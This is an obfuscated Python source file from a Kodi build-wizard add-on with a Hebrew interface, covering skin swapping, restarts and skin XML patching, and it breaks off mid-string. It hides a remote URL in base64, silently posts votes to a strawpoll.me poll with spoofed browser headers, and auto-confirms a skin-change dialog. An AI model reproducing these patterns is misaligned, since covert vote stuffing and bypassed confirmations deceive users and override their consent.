# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 =''#line:252
IPTVSIMPL18PC =''#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	OOOO00O0OOOOOO00O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	OO0OO00O00O0O0OOO =[];OOOOOOO0OOO0O0OO0 =[]#line:266
	for OO000O0O0OO000O0O in sorted (OOOO00O0OOOOOO00O ,key =lambda OOO0O0O00OOOO0OOO :OOO0O0O00OOOO0OOO ):#line:267
		O00O0OO0OOO0OOO00 =os .path .split (OO000O0O0OO000O0O [:-1 ])[1 ]#line:268
		O0O0O0O00O0O0O0O0 =os .path .join (OO000O0O0OO000O0O ,'addon.xml')#line:269
		if os .path .exists (O0O0O0O00O0O0O0O0 ):#line:270
			OO000OO00OOOOOOO0 =open (O0O0O0O00O0O0O0O0 )#line:271
			O0OOO0O000O0O0OOO =OO000OO00OOOOOOO0 .read ()#line:272
			O00OOO00OO00OO0O0 =parseDOM2 (O0OOO0O000O0O0OOO ,'addon',ret ='id')#line:273
			O0O0O0OO0O00OOOOO =O00O0OO0OOO0OOO00 if len (O00OOO00OO00OO0O0 )==0 else O00OOO00OO00OO0O0 [0 ]#line:274
			try :#line:275
				O00O0O0O0O0O0O0O0 =xbmcaddon .Addon (id =O0O0O0OO0O00OOOOO )#line:276
				OO0OO00O00O0O0OOO .append (O00O0O0O0O0O0O0O0 .getAddonInfo ('name'))#line:277
				OOOOOOO0OOO0O0OO0 .append (O0O0O0OO0O00OOOOO )#line:278
			except :#line:279
				pass #line:280
	OO0O000O0O0O000OO =[];OOOOOOOOOO00O00OO =0 #line:281
	OO0000O00OO00OO0O =["Current Skin -- %s"%currSkin ()]+OO0OO00O00O0O0OOO #line:282
	OOOOOOOOOO00O00OO =DIALOG .select ("Select the Skin you want to swap with.",OO0000O00OO00OO0O )#line:283
	if OOOOOOOOOO00O00OO ==-1 :return #line:284
	else :#line:285
		O0O00O00O0O0OO0OO =(OOOOOOOOOO00O00OO -1 )#line:286
		OO0O000O0O0O000OO .append (O0O00O00O0O0OO0OO )#line:287
		OO0000O00OO00OO0O [OOOOOOOOOO00O00OO ]="%s"%(OO0OO00O00O0O0OOO [O0O00O00O0O0OO0OO ])#line:288
	if OO0O000O0O0O000OO ==None :return #line:289
	for OOO0OOOOOOOO00O00 in OO0O000O0O0O000OO :#line:290
		swapSkins (OOOOOOO0OOO0O0OO0 [OOO0OOOOOOOO00O00 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (OOO0O00O000000O00 ,title ="Error"):#line:295
	OOOO0OO0OOO0OOO0O ='lookandfeel.skin'#line:296
	OO000OOO0O0OOOOOO =OOO0O00O000000O00 #line:297
	O0000O0O0OOO000O0 =getOld (OOOO0OO0OOO0OOO0O )#line:298
	O0O00OO0O00O0OO00 =OOOO0OO0OOO0OOO0O #line:299
	setNew (O0O00OO0O00O0OO00 ,OO000OOO0O0OOOOOO )#line:300
	O0OOO0OOO000O0O0O =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO0OOO000O0O0O <100 :#line:302
		O0OOO0OOO000O0O0O +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O00OOO00O0O0OOOO0 ):#line:309
	try :#line:310
		O00OOO00O0O0OOOO0 ='"%s"'%O00OOO00O0O0OOOO0 #line:311
		OOO00000000O00000 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O00OOO00O0O0OOOO0 )#line:312
		O0O0O00OO0OO00O0O =xbmc .executeJSONRPC (OOO00000000O00000 )#line:314
		O0O0O00OO0OO00O0O =simplejson .loads (O0O0O00OO0OO00O0O )#line:315
		if O0O0O00OO0OO00O0O .has_key ('result'):#line:316
			if O0O0O00OO0OO00O0O ['result'].has_key ('value'):#line:317
				return O0O0O00OO0OO00O0O ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (O000O000O0O00OO0O ,OO00000000O0O0OOO ):#line:324
	try :#line:325
		O000O000O0O00OO0O ='"%s"'%O000O000O0O00OO0O #line:326
		OO00000000O0O0OOO ='"%s"'%OO00000000O0O0OOO #line:327
		OO000OOOO0O0OO000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O000O000O0O00OO0O ,OO00000000O0O0OOO )#line:328
		OOOOO000OOO00OO00 =xbmc .executeJSONRPC (OO000OOOO0O0OO000 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			OOOOOO00000000000 =xbmcgui .DialogProgress ()#line:339
			OOOOOO00000000000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			OOOOOO00000000000 .update (0 )#line:343
			for OO00O000O0OOO0OOO in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				OOOOOO00000000000 .update (int ((5 -OO00O000O0OOO0OOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO00O000O0OOO0OOO ),'')#line:346
				if OOOOOO00000000000 .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			OOOOOO00000000000 =xbmcgui .DialogProgress ()#line:352
			OOOOOO00000000000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			OOOOOO00000000000 .update (0 )#line:356
			for OO00O000O0OOO0OOO in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				OOOOOO00000000000 .update (int ((5 -OO00O000O0OOO0OOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO00O000O0OOO0OOO ),'')#line:359
				if OOOOOO00000000000 .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    OO00O00OOOO000O00 ='18773068'#line:372
    OO0OOO0OOOOO00O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO00O00OOOO000O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    OO000O0OOOO00O00O ='145273320'#line:386
    O00000O0OOO00OO00 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        OOOO0OO0O00OO00O0 =OO000O0OOOO00O00O #line:389
    else :#line:390
        OOOO0OO0O00OO00O0 =O00000O0OOO00OO00 #line:391
    OO0O0OOOO000OOOOO ={'options':OOOO0OO0O00OO00O0 }#line:395
    OOOO0O00000OO0O0O =requests .post ('https://www.strawpoll.me/'+OO00O00OOOO000O00 ,headers =OO0OOO0OOOOO00O0O ,data =OO0O0OOOO000OOOOO )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        O0000O0OOO00OO0O0 ='18773068'#line:401
        O0OOO0000O0O0O00O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0000O0OOO00OO0O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        OO0000O000OO00OO0 ='145273320'#line:415
        OO00O0O0O00000OO0 ={'options':OO0000O000OO00OO0 }#line:421
        OOO00O0OOO00O0OO0 =requests .post ('https://www.strawpoll.me/'+O0000O0OOO00OO0O0 ,headers =O0OOO0000O0O0O00O ,data =OO00O0O0O00000OO0 )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        O0O0O0OOO0OO00O00 ='18773068'#line:428
        O0OO0OOO00OO0OO00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0O0OOO0OO00O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        O00O0O0O0OOO0OOOO ='145273321'#line:442
        OO0O000000O0OO00O ={'options':O00O0O0O0OOO0OOOO }#line:448
        OO0OOOO0O00OOO00O =requests .post ('https://www.strawpoll.me/'+O0O0O0OOO0OO00O00 ,headers =O0OO0OOO00OO0OO00 ,data =OO0O000000O0OO00O )#line:450
   except :pass #line:451
def kodi17to18 ():#line:454
  if KODIV >=18 :#line:456
    OOO0O00OO00OOO0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:458
    with open (OOO0O00OO00OOO0OO ,'r')as O0OO0O0O0O0OO00OO :#line:459
      OOO0OOO00000O000O =O0OO0O0O0O0OO00OO .read ()#line:460
    OOO0OOO00000O000O =OOO0OOO00000O000O .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:507
    with open (OOO0O00OO00OOO0OO ,'w')as O0OO0O0O0O0OO00OO :#line:510
      O0OO0O0O0O0OO00OO .write (OOO0OOO00000O000O )#line:511
    OOO0O00OO00OOO0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:517
    with open (OOO0O00OO00OOO0OO ,'r')as O0OO0O0O0O0OO00OO :#line:518
      OOO0OOO00000O000O =O0OO0O0O0O0OO00OO .read ()#line:519
    OOO0OOO00000O000O =OOO0OOO00000O000O .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
